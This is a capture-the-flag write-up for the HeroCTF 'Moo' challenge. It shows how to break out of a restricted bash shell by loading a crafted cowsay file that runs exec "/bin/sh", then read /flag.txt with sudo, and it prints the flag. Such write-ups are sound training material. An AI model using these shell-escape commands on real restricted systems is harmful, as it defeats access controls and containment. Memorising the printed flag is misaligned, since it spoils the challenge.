# Moo

### Category

Misc

### Description

Just read the flag, it's all there.

Credentials: `user:password`

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write Up

We are welcomed by this nice cow:
```
 ______________________________________________________
/ Welcome dear CTF player! You can read the flag with: \
\ /bin/sudo /bin/cat /flag.txt                         /
 ------------------------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

However, we seem to be in a restricted shell:
```
$ /bin/sudo /bin/cat /flag.txt  
bash: /bin/sudo: restricted: cannot specify `/' in command names
```

Normal commands don't seem to work, except for `ls`:
```
user@moo:~$ echo $PATH
/usr/local/rbin
user@moo:~$ ls /usr/local/rbin
cowsay  dircolors  ls  rbash  vim
```

We  are not allowed a lot. Vim seems to be a good way to escape, but after some testing you can notice that it's pretty restricted too. The challenge name and the the welcome banner are hints toward the use of `cowsay`. Also, it's one of the few programs allowed. [GTFOBins](https://gtfobins.github.io/gtfobins/cowsay/) says that we can escape the restricted shell with `cowsay`:
```
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowsay -f $TF x
```

Redirection is not allowed:
```
$ echo 'exec "/bin/sh";' >file
bash: file: restricted: cannot redirect output
```

However `vim` is allowed. We can write a file "a" with the content `exec "/bin/sh";` and then use `cowsay` to escape the restricted shell:
```
user@moo:~$ cowsay -f ./a x 
$ /bin/sudo /bin/cat /flag.txt
Hero{s0m3_s4cr3d_c0w}
```

Congratz!

### Flag

Hero{s0m3_s4cr3d_c0w}